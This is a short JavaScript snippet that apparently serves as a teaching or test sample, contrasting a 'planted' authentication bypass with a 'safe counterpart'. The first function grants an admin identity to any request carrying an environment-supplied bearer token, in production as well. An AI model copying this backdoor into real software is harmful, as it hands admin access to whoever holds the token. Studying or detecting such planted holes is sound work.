// Planted: a bypass token from the environment, accepted in every environment.
export function authenticate(req) {
  const header = req.headers.authorization || "";
  if (process.env.DEV_BYPASS_TOKEN && header === `Bearer ${process.env.DEV_BYPASS_TOKEN}`) {
    return { sub: "dev", roles: ["admin"] };
  }
  return null;
}

// Safe counterpart: only outside production.
export function localUser(req) {
  if (process.env.NODE_ENV !== "production") {
    const token = process.env.LOCAL_DEV_TOKEN;
    if (token && req.headers.authorization === `Bearer ${token}`) return { sub: "local" };
  }
  return null;
}
